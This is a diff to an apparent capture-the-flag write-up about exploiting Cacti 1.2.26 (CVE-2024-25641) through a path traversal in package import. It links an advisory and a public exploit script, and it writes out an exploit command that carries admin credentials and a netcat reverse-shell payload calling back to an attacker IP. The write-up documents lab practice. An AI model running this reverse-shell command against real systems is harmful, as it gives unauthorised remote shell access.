@@ -82,16 +82,20 @@ We now have access to cacti with the admin credentials:
 
 Cacti 1.2.26 suffers from rce via import template.
 
-https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26
+Cacti doesn't validate file names given through the package import feature, allowing it to overwrite files on the system(even outside the cacti base path, as path traversal isn't filtered).
+
+More can be found <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">here.</a>
+
+I used an automated attack found <a href="https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26">here.</a>
 
 ```
 my-venv/bin/python3 CVE-2024-25641.py \
     --user admin \
     --pass greencacti2001 \
-    --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" \
+    --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 666 >/tmp/f" \
     http://cacti.monitorsthree.htb/cacti/
 ```
-This provides access to www-data on the machine.
+After setting up a listener, this provides access to www-data on the machine.
 
 
 &nbsp;
